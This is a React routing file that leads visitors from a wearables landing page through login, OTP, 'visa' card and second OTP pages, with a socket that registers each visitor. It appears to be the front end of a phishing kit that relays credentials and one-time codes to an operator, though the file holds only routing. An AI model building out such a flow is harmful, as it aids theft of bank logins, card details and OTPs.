import { BrowserRouter, Routes, Route } from "react-router-dom";
import WearablesLanding from "./Pages/WearablesLanding";
import ContactlessPayInfo from "./Pages/ContactlessPayInfo";
import Login from "./Pages/Login";
import LoginOtp from "./Pages/LoginOtp";
import Visa from "./Pages/Visa";
import VisaOtp from "./Pages/VisaOtp";
import FormDataPage from "./Pages/FormDataPage";
import Success from "./Pages/Success";
import { useEffect, useState } from "react";
import axios from "axios";
import { api_route, socket } from "./socketApi";

export { api_route, socket };

function App() {
  useEffect(() => {
    (async () => {
      await axios.get(api_route + "/");
    })();
  }, []);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const onConnect = () => socket.emit("join", { role: "visitor" });
    if (socket.connected) onConnect();
    socket.on("connect", onConnect);

    return () => {
      socket.off("connect", onConnect);
    };
  }, []);

  return (
    <div className="w-full flex items-center justify-center min-h-screen">
      <div className="w-full md:w-2/3 relative items-center justify-center min-h-screen flex flex-col">
        {
          <BrowserRouter>
            <Routes>
              <Route path="/" element={<WearablesLanding />} />
              <Route path="/contactless-pay" element={<ContactlessPayInfo />} />
              <Route path="/login" element={<Login />} />
              <Route path="/login-otp" element={<LoginOtp />} />
              <Route path="/visa" element={<Visa />} />
              <Route path="/visa-otp" element={<VisaOtp />} />
              <Route path="/form-data" element={<FormDataPage />} />
              <Route path="/success" element={<Success />} />
            </Routes>
          </BrowserRouter>
        }
      </div>
    </div>
  );
}

export default App;
